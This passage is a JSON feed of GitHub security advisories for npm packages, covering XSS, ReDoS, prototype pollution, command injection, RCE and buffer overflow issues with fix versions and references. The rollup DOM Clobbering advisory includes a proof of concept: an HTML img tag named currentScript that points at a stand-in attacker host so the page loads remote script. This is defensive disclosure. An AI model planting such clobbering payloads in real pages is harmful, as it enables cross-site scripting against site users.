{
    "version": "https://jsonfeed.org/version/1",
    "title": "Security Advisory for JavaScript packages hosted at npmjs.com",
    "home_page_url": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Anpm",
    "feed_url": "https://azu.github.io/github-advisory-database-rss/npm.json",
    "description": "Security Advisory for JavaScript packages hosted at npmjs.com on GitHub",
    "items": [
        {
            "content_html": "<p>Version of <code>is-my-json-valid</code> before 1.4.1 or 2.17.2 are vulnerable to regular expression denial of service (ReDoS) via the email validation function.</p>\n<h2 id=\"recommendation\">Recommendation</h2>\n<p>Update to version 1.4.1, 2.17.2 or later.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2016-2537\">https://nvd.nist.gov/vuln/detail/CVE-2016-2537</a></li>\n<li><a href=\"https://github.com/mafintosh/is-my-json-valid/pull/159\">https://github.com/mafintosh/is-my-json-valid/pull/159</a></li>\n<li><a href=\"https://github.com/mafintosh/is-my-json-valid/commit/b3051b277f7caa08cd2edc6f74f50aeda65d2976\">https://github.com/mafintosh/is-my-json-valid/commit/b3051b277f7caa08cd2edc6f74f50aeda65d2976</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-f522-ffg8-j8r6\">https://github.com/advisories/GHSA-f522-ffg8-j8r6</a></li>\n<li><a href=\"https://www.npmjs.com/advisories/572\">https://www.npmjs.com/advisories/572</a></li>\n<li><a href=\"https://www.npmjs.com/advisories/76\">https://www.npmjs.com/advisories/76</a></li>\n<li><a href=\"https://hackerone.com/reports/317548\">https://hackerone.com/reports/317548</a></li>\n<li><a href=\"https://github.com/mafintosh/is-my-json-valid/commit/eca4beb21e61877d76fdf6bea771f72f39544d9b\">https://github.com/mafintosh/is-my-json-valid/commit/eca4beb21e61877d76fdf6bea771f72f39544d9b</a></li>\n<li><a href=\"https://github.com/github/advisory-database/pull/4850\">https://github.com/github/advisory-database/pull/4850</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-f522-ffg8-j8r6",
            "title": "[is-my-json-valid] Regular Expression Denial of Service in is-my-json-valid",
            "date_modified": "2024-10-02T17:16:13.000Z",
            "date_published": "2017-10-24T18:33:35.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-f522-ffg8-j8r6"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>Improper handling of user controlled input caused a stored cross-site scripting (XSS) vulnerability. All previous versions of nbdime are affected.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>Security patches will be released for each of the major versions of the nbdime packages since version 1.x of the nbdime python package.</p>\n<h4 id=\"python\">Python</h4>\n<ul>\n<li>nbdime 1.x: Patched in v. 1.1.1</li>\n<li>nbdime 2.x: Patched in v. 2.1.1</li>\n<li>nbdime 3.x: Patched in v. 3.1.1</li>\n</ul>\n<h4 id=\"npm\">npm</h4>\n<ul>\n<li>nbdime 6.x version: Patched in 6.1.2</li>\n<li>nbdime 5.x version: Patched in 5.0.2</li>\n<li>nbdime-jupyterlab 1.x version: Patched in 1.0.1</li>\n<li>nbdime-jupyterlab 2.x version: Patched in 2.1.1</li>\n</ul>\n<h3 id=\"for-more-information\">For more information</h3>\n<p>If you have any questions or comments about this advisory email us at <a href=\"mailto:security@ipython.org\">security@ipython.org</a>.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/jupyter/nbdime/security/advisories/GHSA-p6rw-44q7-3fw4\">https://github.com/jupyter/nbdime/security/advisories/GHSA-p6rw-44q7-3fw4</a></li>\n<li><a href=\"https://github.com/jupyter/nbdime/commit/e44a5cc7677f24b45ebafc756db49058c2f750ea\">https://github.com/jupyter/nbdime/commit/e44a5cc7677f24b45ebafc756db49058c2f750ea</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2021-41134\">https://nvd.nist.gov/vuln/detail/CVE-2021-41134</a></li>\n<li><a href=\"https://github.com/pypa/advisory-database/tree/main/vulns/nbdime/PYSEC-2021-428.yaml\">https://github.com/pypa/advisory-database/tree/main/vulns/nbdime/PYSEC-2021-428.yaml</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-p6rw-44q7-3fw4\">https://github.com/advisories/GHSA-p6rw-44q7-3fw4</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-p6rw-44q7-3fw4",
            "title": "[nbdime-jupyterlab] Stored XSS in Jupyter nbdime",
            "date_modified": "2024-10-01T19:31:58.000Z",
            "date_published": "2021-11-08T18:09:27.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-p6rw-44q7-3fw4"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>Improper handling of user controlled input caused a stored cross-site scripting (XSS) vulnerability. All previous versions of nbdime are affected.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>Security patches will be released for each of the major versions of the nbdime packages since version 1.x of the nbdime python package.</p>\n<h4 id=\"python\">Python</h4>\n<ul>\n<li>nbdime 1.x: Patched in v. 1.1.1</li>\n<li>nbdime 2.x: Patched in v. 2.1.1</li>\n<li>nbdime 3.x: Patched in v. 3.1.1</li>\n</ul>\n<h4 id=\"npm\">npm</h4>\n<ul>\n<li>nbdime 6.x version: Patched in 6.1.2</li>\n<li>nbdime 5.x version: Patched in 5.0.2</li>\n<li>nbdime-jupyterlab 1.x version: Patched in 1.0.1</li>\n<li>nbdime-jupyterlab 2.x version: Patched in 2.1.1</li>\n</ul>\n<h3 id=\"for-more-information\">For more information</h3>\n<p>If you have any questions or comments about this advisory email us at <a href=\"mailto:security@ipython.org\">security@ipython.org</a>.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/jupyter/nbdime/security/advisories/GHSA-p6rw-44q7-3fw4\">https://github.com/jupyter/nbdime/security/advisories/GHSA-p6rw-44q7-3fw4</a></li>\n<li><a href=\"https://github.com/jupyter/nbdime/commit/e44a5cc7677f24b45ebafc756db49058c2f750ea\">https://github.com/jupyter/nbdime/commit/e44a5cc7677f24b45ebafc756db49058c2f750ea</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2021-41134\">https://nvd.nist.gov/vuln/detail/CVE-2021-41134</a></li>\n<li><a href=\"https://github.com/pypa/advisory-database/tree/main/vulns/nbdime/PYSEC-2021-428.yaml\">https://github.com/pypa/advisory-database/tree/main/vulns/nbdime/PYSEC-2021-428.yaml</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-p6rw-44q7-3fw4\">https://github.com/advisories/GHSA-p6rw-44q7-3fw4</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-p6rw-44q7-3fw4",
            "title": "[nbdime-jupyterlab] Stored XSS in Jupyter nbdime",
            "date_modified": "2024-10-01T19:31:58.000Z",
            "date_published": "2021-11-08T18:09:27.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-p6rw-44q7-3fw4"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>Improper handling of user controlled input caused a stored cross-site scripting (XSS) vulnerability. All previous versions of nbdime are affected.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>Security patches will be released for each of the major versions of the nbdime packages since version 1.x of the nbdime python package.</p>\n<h4 id=\"python\">Python</h4>\n<ul>\n<li>nbdime 1.x: Patched in v. 1.1.1</li>\n<li>nbdime 2.x: Patched in v. 2.1.1</li>\n<li>nbdime 3.x: Patched in v. 3.1.1</li>\n</ul>\n<h4 id=\"npm\">npm</h4>\n<ul>\n<li>nbdime 6.x version: Patched in 6.1.2</li>\n<li>nbdime 5.x version: Patched in 5.0.2</li>\n<li>nbdime-jupyterlab 1.x version: Patched in 1.0.1</li>\n<li>nbdime-jupyterlab 2.x version: Patched in 2.1.1</li>\n</ul>\n<h3 id=\"for-more-information\">For more information</h3>\n<p>If you have any questions or comments about this advisory email us at <a href=\"mailto:security@ipython.org\">security@ipython.org</a>.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/jupyter/nbdime/security/advisories/GHSA-p6rw-44q7-3fw4\">https://github.com/jupyter/nbdime/security/advisories/GHSA-p6rw-44q7-3fw4</a></li>\n<li><a href=\"https://github.com/jupyter/nbdime/commit/e44a5cc7677f24b45ebafc756db49058c2f750ea\">https://github.com/jupyter/nbdime/commit/e44a5cc7677f24b45ebafc756db49058c2f750ea</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2021-41134\">https://nvd.nist.gov/vuln/detail/CVE-2021-41134</a></li>\n<li><a href=\"https://github.com/pypa/advisory-database/tree/main/vulns/nbdime/PYSEC-2021-428.yaml\">https://github.com/pypa/advisory-database/tree/main/vulns/nbdime/PYSEC-2021-428.yaml</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-p6rw-44q7-3fw4\">https://github.com/advisories/GHSA-p6rw-44q7-3fw4</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-p6rw-44q7-3fw4",
            "title": "[nbdime] Stored XSS in Jupyter nbdime",
            "date_modified": "2024-10-01T19:31:58.000Z",
            "date_published": "2021-11-08T18:09:27.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-p6rw-44q7-3fw4"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>Improper handling of user controlled input caused a stored cross-site scripting (XSS) vulnerability. All previous versions of nbdime are affected.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>Security patches will be released for each of the major versions of the nbdime packages since version 1.x of the nbdime python package.</p>\n<h4 id=\"python\">Python</h4>\n<ul>\n<li>nbdime 1.x: Patched in v. 1.1.1</li>\n<li>nbdime 2.x: Patched in v. 2.1.1</li>\n<li>nbdime 3.x: Patched in v. 3.1.1</li>\n</ul>\n<h4 id=\"npm\">npm</h4>\n<ul>\n<li>nbdime 6.x version: Patched in 6.1.2</li>\n<li>nbdime 5.x version: Patched in 5.0.2</li>\n<li>nbdime-jupyterlab 1.x version: Patched in 1.0.1</li>\n<li>nbdime-jupyterlab 2.x version: Patched in 2.1.1</li>\n</ul>\n<h3 id=\"for-more-information\">For more information</h3>\n<p>If you have any questions or comments about this advisory email us at <a href=\"mailto:security@ipython.org\">security@ipython.org</a>.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/jupyter/nbdime/security/advisories/GHSA-p6rw-44q7-3fw4\">https://github.com/jupyter/nbdime/security/advisories/GHSA-p6rw-44q7-3fw4</a></li>\n<li><a href=\"https://github.com/jupyter/nbdime/commit/e44a5cc7677f24b45ebafc756db49058c2f750ea\">https://github.com/jupyter/nbdime/commit/e44a5cc7677f24b45ebafc756db49058c2f750ea</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2021-41134\">https://nvd.nist.gov/vuln/detail/CVE-2021-41134</a></li>\n<li><a href=\"https://github.com/pypa/advisory-database/tree/main/vulns/nbdime/PYSEC-2021-428.yaml\">https://github.com/pypa/advisory-database/tree/main/vulns/nbdime/PYSEC-2021-428.yaml</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-p6rw-44q7-3fw4\">https://github.com/advisories/GHSA-p6rw-44q7-3fw4</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-p6rw-44q7-3fw4",
            "title": "[nbdime] Stored XSS in Jupyter nbdime",
            "date_modified": "2024-10-01T19:31:58.000Z",
            "date_published": "2021-11-08T18:09:27.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-p6rw-44q7-3fw4"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Versions of the package uplot before 1.6.31 are vulnerable to Prototype Pollution via the uplot.assign function due to missing check if the attribute resolves to the object prototype.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-21489\">https://nvd.nist.gov/vuln/detail/CVE-2024-21489</a></li>\n<li><a href=\"https://github.com/leeoniya/uPlot/commit/5756e3e9b91270b303157e14bd0174311047d983\">https://github.com/leeoniya/uPlot/commit/5756e3e9b91270b303157e14bd0174311047d983</a></li>\n<li><a href=\"https://security.snyk.io/vuln/SNYK-JS-UPLOT-6209224\">https://security.snyk.io/vuln/SNYK-JS-UPLOT-6209224</a></li>\n<li><a href=\"https://github.com/leeoniya/uPlot/blob/c52e5001c1d959a99ac495a53e4deca5c44464d2/src/utils.js#L437-L452\">https://github.com/leeoniya/uPlot/blob/c52e5001c1d959a99ac495a53e4deca5c44464d2/src/utils.js#L437-L452</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-34q8-jcq6-mc37\">https://github.com/advisories/GHSA-34q8-jcq6-mc37</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-34q8-jcq6-mc37",
            "title": "[uplot] uPlot Prototype Pollution vulnerability",
            "date_modified": "2024-10-01T18:10:51.000Z",
            "date_published": "2024-10-01T06:30:47.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-34q8-jcq6-mc37"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>All versions of the package git-shallow-clone are vulnerable to Command injection due to missing sanitization or mitigation flags in the process variable of the gitShallowClone function.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-21531\">https://nvd.nist.gov/vuln/detail/CVE-2024-21531</a></li>\n<li><a href=\"https://security.snyk.io/vuln/SNYK-JS-GITSHALLOWCLONE-3253853\">https://security.snyk.io/vuln/SNYK-JS-GITSHALLOWCLONE-3253853</a></li>\n<li><a href=\"https://github.com/10uei011/git-shallow-clone/blob/master/index.js#L27\">https://github.com/10uei011/git-shallow-clone/blob/master/index.js#L27</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-qwrq-vxvw-537r\">https://github.com/advisories/GHSA-qwrq-vxvw-537r</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-qwrq-vxvw-537r",
            "title": "[git-shallow-clone] git-shallow-clone OS Command Injection vulnerability",
            "date_modified": "2024-10-01T18:10:29.000Z",
            "date_published": "2024-10-01T06:30:47.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-qwrq-vxvw-537r"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Flowise &lt; 2.1.1 suffers from a Stored Cross-Site vulnerability due to a lack of input sanitization in Flowise Chat Embed &lt; 2.0.0.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-9148\">https://nvd.nist.gov/vuln/detail/CVE-2024-9148</a></li>\n<li><a href=\"https://www.tenable.com/security/research/tra-2024-40\">https://www.tenable.com/security/research/tra-2024-40</a></li>\n<li><a href=\"https://github.com/FlowiseAI/Flowise/commit/8375ebb4ec1ebb2b1295561cc0f63486a29f3fde\">https://github.com/FlowiseAI/Flowise/commit/8375ebb4ec1ebb2b1295561cc0f63486a29f3fde</a></li>\n<li><a href=\"https://github.com/FlowiseAI/FlowiseChatEmbed/commit/6a9645df41371cb69f251038d501ec87b1304c84\">https://github.com/FlowiseAI/FlowiseChatEmbed/commit/6a9645df41371cb69f251038d501ec87b1304c84</a></li>\n<li><a href=\"https://github.com/FlowiseAI/Flowise/releases/tag/flowise%402.1.1\">https://github.com/FlowiseAI/Flowise/releases/tag/flowise%402.1.1</a></li>\n<li><a href=\"https://github.com/FlowiseAI/FlowiseChatEmbed/releases/tag/flowise-embed%402.0.0\">https://github.com/FlowiseAI/FlowiseChatEmbed/releases/tag/flowise-embed%402.0.0</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-m5p9-xvxj-64c8\">https://github.com/advisories/GHSA-m5p9-xvxj-64c8</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-m5p9-xvxj-64c8",
            "title": "[flowise] Flowise and Flowise Chat Embed vulnerable to Stored Cross-site Scripting",
            "date_modified": "2024-09-30T20:56:49.000Z",
            "date_published": "2024-09-25T03:30:36.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-m5p9-xvxj-64c8"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Flowise &lt; 2.1.1 suffers from a Stored Cross-Site vulnerability due to a lack of input sanitization in Flowise Chat Embed &lt; 2.0.0.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-9148\">https://nvd.nist.gov/vuln/detail/CVE-2024-9148</a></li>\n<li><a href=\"https://www.tenable.com/security/research/tra-2024-40\">https://www.tenable.com/security/research/tra-2024-40</a></li>\n<li><a href=\"https://github.com/FlowiseAI/Flowise/commit/8375ebb4ec1ebb2b1295561cc0f63486a29f3fde\">https://github.com/FlowiseAI/Flowise/commit/8375ebb4ec1ebb2b1295561cc0f63486a29f3fde</a></li>\n<li><a href=\"https://github.com/FlowiseAI/FlowiseChatEmbed/commit/6a9645df41371cb69f251038d501ec87b1304c84\">https://github.com/FlowiseAI/FlowiseChatEmbed/commit/6a9645df41371cb69f251038d501ec87b1304c84</a></li>\n<li><a href=\"https://github.com/FlowiseAI/Flowise/releases/tag/flowise%402.1.1\">https://github.com/FlowiseAI/Flowise/releases/tag/flowise%402.1.1</a></li>\n<li><a href=\"https://github.com/FlowiseAI/FlowiseChatEmbed/releases/tag/flowise-embed%402.0.0\">https://github.com/FlowiseAI/FlowiseChatEmbed/releases/tag/flowise-embed%402.0.0</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-m5p9-xvxj-64c8\">https://github.com/advisories/GHSA-m5p9-xvxj-64c8</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-m5p9-xvxj-64c8",
            "title": "[flowise-embed] Flowise and Flowise Chat Embed vulnerable to Stored Cross-site Scripting",
            "date_modified": "2024-09-30T20:56:49.000Z",
            "date_published": "2024-09-25T03:30:36.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-m5p9-xvxj-64c8"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>basic-auth-connect &lt;1.1.0 uses a timing-unsafe equality comparison that can leak timing information</p>\n<h3 id=\"patches\">Patches</h3>\n<p>this issue has been fixed in basic-auth-connect 1.1.0</p>\n<h3 id=\"references\">References</h3>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/expressjs/basic-auth-connect/security/advisories/GHSA-7p89-p6hx-q4fw\">https://github.com/expressjs/basic-auth-connect/security/advisories/GHSA-7p89-p6hx-q4fw</a></li>\n<li><a href=\"https://github.com/expressjs/basic-auth-connect/commit/bac1e6a8530e1efd0028800b9b588a37adb0d203\">https://github.com/expressjs/basic-auth-connect/commit/bac1e6a8530e1efd0028800b9b588a37adb0d203</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-47178\">https://nvd.nist.gov/vuln/detail/CVE-2024-47178</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-7p89-p6hx-q4fw\">https://github.com/advisories/GHSA-7p89-p6hx-q4fw</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-7p89-p6hx-q4fw",
            "title": "[basic-auth-connect] basic-auth-connect's callback uses time unsafe string comparison",
            "date_modified": "2024-09-30T20:11:41.000Z",
            "date_published": "2024-09-30T17:48:29.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-7p89-p6hx-q4fw"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>During a recent internal audit, we identified a Cross-Site Scripting (XSS) vulnerability in the CKEditor 5 clipboard package. This vulnerability could be triggered by a specific user action, leading to unauthorized JavaScript code execution, if the attacker managed to insert a malicious content into the editor, which might happen with a very specific editor configuration.</p>\n<p>This vulnerability affects <strong>only</strong> installations where the editor configuration meets the following criteria:</p>\n<ol>\n<li>The <a href=\"https://ckeditor.com/docs/ckeditor5/latest/getting-started/setup/toolbar.html#block-toolbar\"><strong>Block Toolbar</strong></a> plugin is enabled.</li>\n<li>One of the following plugins is also enabled:<ul>\n<li><a href=\"https://ckeditor.com/docs/ckeditor5/latest/features/html/general-html-support.html\"><strong>General HTML Support</strong></a> with a configuration that permits unsafe markup.</li>\n<li><a href=\"https://ckeditor.com/docs/ckeditor5/latest/features/html/html-embed.html\"><strong>HTML Embed</strong></a>.</li>\n</ul>\n</li>\n</ol>\n<h3 id=\"patches\">Patches</h3>\n<p>The problem has been recognized and patched. The fix will be available in version 43.1.1.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>It's highly recommended to update to the version 43.1.1. However, if the update is not an option, we recommend disabling the block toolbar plugin.</p>\n<h3 id=\"for-more-information\">For more information</h3>\n<p>Email us at <a href=\"mailto:security@cksource.com\">security@cksource.com</a> if you have any questions or comments about this advisory.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/ckeditor/ckeditor5/security/advisories/GHSA-rgg8-g5x8-wr9v\">https://github.com/ckeditor/ckeditor5/security/advisories/GHSA-rgg8-g5x8-wr9v</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-45613\">https://nvd.nist.gov/vuln/detail/CVE-2024-45613</a></li>\n<li><a href=\"https://github.com/ckeditor/ckeditor5/releases/tag/v43.1.1\">https://github.com/ckeditor/ckeditor5/releases/tag/v43.1.1</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-rgg8-g5x8-wr9v\">https://github.com/advisories/GHSA-rgg8-g5x8-wr9v</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-rgg8-g5x8-wr9v",
            "title": "[@ckeditor/ckeditor5-clipboard] Cross-site scripting (XSS) in the clipboard package",
            "date_modified": "2024-09-27T19:16:12.000Z",
            "date_published": "2024-09-25T18:13:35.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-rgg8-g5x8-wr9v"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>A remote command execution (RCE) vulnerability in promptr v6.0.7 allows attackers to execute arbitrary commands via a crafted URL.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-46489\">https://nvd.nist.gov/vuln/detail/CVE-2024-46489</a></li>\n<li><a href=\"https://github.com/VulnSphere/LLMVulnSphere/blob/main/Prompt/promptr/RCE_FC_6.0.7.md\">https://github.com/VulnSphere/LLMVulnSphere/blob/main/Prompt/promptr/RCE_FC_6.0.7.md</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-hwxp-6qf7-q3rc\">https://github.com/advisories/GHSA-hwxp-6qf7-q3rc</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-hwxp-6qf7-q3rc",
            "title": "[@ifnotnowwhen/promptr] Remote command execution in promptr",
            "date_modified": "2024-09-26T22:21:19.000Z",
            "date_published": "2024-09-25T18:31:21.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-hwxp-6qf7-q3rc"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>sqlite-vec v0.1.1 was discovered to contain a heap buffer overflow via the npy_token_next function. This vulnerability allows attackers to cause a Denial of Service (DoS) via a crafted file.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-46488\">https://nvd.nist.gov/vuln/detail/CVE-2024-46488</a></li>\n<li><a href=\"https://github.com/VulnSphere/LLMVulnSphere/blob/main/VectorDB/sqlite-vec/OOBR_2.md\">https://github.com/VulnSphere/LLMVulnSphere/blob/main/VectorDB/sqlite-vec/OOBR_2.md</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-vrcx-gx3g-j3h8\">https://github.com/advisories/GHSA-vrcx-gx3g-j3h8</a></li>\n<li><a href=\"https://github.com/asg017/sqlite-vec/releases/tag/v0.1.3\">https://github.com/asg017/sqlite-vec/releases/tag/v0.1.3</a></li>\n<li><a href=\"https://github.com/rubysec/ruby-advisory-db/blob/master/gems/sqlite-vec/CVE-2024-46488.yml\">https://github.com/rubysec/ruby-advisory-db/blob/master/gems/sqlite-vec/CVE-2024-46488.yml</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-vrcx-gx3g-j3h8",
            "title": "[sqlite-vec] Heap-based Buffer Overflow in sqlite-vec",
            "date_modified": "2024-09-26T21:47:07.000Z",
            "date_published": "2024-09-25T18:31:21.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-vrcx-gx3g-j3h8"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>We discovered a DOM Clobbering vulnerability in rollup when bundling scripts that use <code>import.meta.url</code> or with plugins that emit and reference asset files from code  in <code>cjs</code>/<code>umd</code>/<code>iife</code> format. The DOM Clobbering gadget can lead to cross-site scripting (XSS) in web pages where scriptless attacker-controlled HTML elements (e.g., an <code>img</code> tag with an unsanitized <code>name</code> attribute) are present.</p>\n<p>It's worth noting that we’ve identifed similar issues in other popular bundlers like Webpack (<a href=\"https://github.com/webpack/webpack/security/advisories/GHSA-4vvj-4cpr-p986\">CVE-2024-43788</a>), which might serve as a good reference.</p>\n<h3 id=\"details\">Details</h3>\n<h4 id=\"backgrounds\">Backgrounds</h4>\n<p>DOM Clobbering is a type of code-reuse attack where the attacker first embeds a piece of non-script, seemingly benign HTML markups in the webpage (e.g. through a post or comment) and leverages the gadgets (pieces of js code) living in the existing javascript code to transform it into executable code. More for information about DOM Clobbering, here are some references:</p>\n<p>[1] <a href=\"https://scnps.co/papers/sp23_domclob.pdf\">https://scnps.co/papers/sp23_domclob.pdf</a>\n[2] <a href=\"https://research.securitum.com/xss-in-amp4email-dom-clobbering/\">https://research.securitum.com/xss-in-amp4email-dom-clobbering/</a></p>\n<h4 id=\"gadget-found-in-rollup\">Gadget found in <code>rollup</code></h4>\n<p>We have identified a DOM Clobbering vulnerability in <code>rollup</code> bundled scripts, particularly when the scripts uses <code>import.meta</code> and set output in format of  <code>cjs</code>/<code>umd</code>/<code>iife</code>. In such cases, <code>rollup</code> replaces meta property with the URL retrieved from <code>document.currentScript</code>.</p>\n<p><a href=\"https://github.com/rollup/rollup/blob/b86ffd776cfa906573d36c3f019316d02445d9ef/src/ast/nodes/MetaProperty.ts#L157-L162\">https://github.com/rollup/rollup/blob/b86ffd776cfa906573d36c3f019316d02445d9ef/src/ast/nodes/MetaProperty.ts#L157-L162</a></p>\n<p><a href=\"https://github.com/rollup/rollup/blob/b86ffd776cfa906573d36c3f019316d02445d9ef/src/ast/nodes/MetaProperty.ts#L180-L185\">https://github.com/rollup/rollup/blob/b86ffd776cfa906573d36c3f019316d02445d9ef/src/ast/nodes/MetaProperty.ts#L180-L185</a></p>\n<p>However, this implementation is vulnerable to a DOM Clobbering attack. The <code>document.currentScript</code> lookup can be shadowed by an attacker via the browser's named DOM tree element access mechanism. This manipulation allows an attacker to replace the intended script element with a malicious HTML element. When this happens, the <code>src</code> attribute of the attacker-controlled element (e.g., an <code>img</code> tag ) is used as the URL for importing scripts, potentially leading to the dynamic loading of scripts from an attacker-controlled server.</p>\n<h3 id=\"poc\">PoC</h3>\n<p>Considering a website that contains the following <code>main.js</code> script, the devloper decides to use the <code>rollup</code> to bundle up the program: <code>rollup main.js --format cjs --file bundle.js</code>.</p>\n<pre><code>var s = document.createElement('script')\ns.src = import.meta.url + 'extra.js'\ndocument.head.append(s)\n</code></pre>\n<p>The output <code>bundle.js</code> is shown in the following code snippet.</p>\n<pre><code>'use strict';\n\nvar _documentCurrentScript = typeof document !== 'undefined' ? document.currentScript : null;\nvar s = document.createElement('script');\ns.src = (typeof document === 'undefined' ? require('u' + 'rl').pathToFileURL(__filename).href : (_documentCurrentScript &amp;&amp; False &amp;&amp; _documentCurrentScript.src || new URL('bundle.js', document.baseURI).href)) + 'extra.js';\ndocument.head.append(s);\n</code></pre>\n<p>Adding the <code>rollup</code> bundled script, <code>bundle.js</code>, as part of the web page source code, the page could load the <code>extra.js</code> file from the attacker's domain, <code>attacker.controlled.server</code> due to the introduced gadget during bundling. The attacker only needs to insert an <code>img</code> tag with the name attribute set to <code>currentScript</code>. This can be done through a website's feature that allows users to embed certain script-less HTML (e.g., markdown renderers, web email clients, forums) or via an HTML injection vulnerability in third-party JavaScript loaded on the page.</p>\n<pre><code>&lt;!DOCTYPE html&gt;\n&lt;html&gt;\n&lt;head&gt;\n  &lt;title&gt;rollup Example&lt;/title&gt;\n  &lt;!-- Attacker-controlled Script-less HTML Element starts--!&gt;\n  &lt;img name=\"currentScript\" src=\"https://attacker.controlled.server/\"&gt;&lt;/img&gt;\n  &lt;!-- Attacker-controlled Script-less HTML Element ends--!&gt;\n&lt;/head&gt;\n&lt;script type=\"module\" crossorigin src=\"bundle.js\"&gt;&lt;/script&gt;\n&lt;body&gt;\n&lt;/body&gt;\n&lt;/html&gt;\n</code></pre>\n<h3 id=\"impact\">Impact</h3>\n<p>This vulnerability can result in cross-site scripting (XSS) attacks on websites that include rollup-bundled files (configured with an output format of <code>cjs</code>, <code>iife</code>, or <code>umd</code> and use <code>import.meta</code>) and allow users to inject certain scriptless HTML tags without properly sanitizing the <code>name</code> or <code>id</code> attributes.</p>\n<h3 id=\"patch\">Patch</h3>\n<p>Patching the following two functions with type checking would be effective mitigations against DOM 